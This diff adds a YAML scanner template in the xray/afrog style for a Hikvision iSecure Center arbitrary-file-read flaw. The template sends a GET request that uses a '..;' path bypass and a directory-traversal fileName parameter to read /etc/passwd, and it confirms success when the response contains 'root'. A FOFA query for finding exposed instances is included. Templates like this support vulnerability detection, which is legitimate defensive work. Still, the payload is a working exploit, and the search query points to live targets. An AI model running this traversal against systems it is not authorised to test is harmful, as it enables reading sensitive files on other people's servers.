@@ -1,0 +1,12 @@
+```
+name: Hikvision-iSecure-Cente-download-readfile
+rules:
+  - method: GET
+    path: "/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"root")
+detail:
+  author: yishuizhe
+  name: 海康威视综合安防download任意文件读取
+  fofa-query: title="综合安防管理平台"
+```
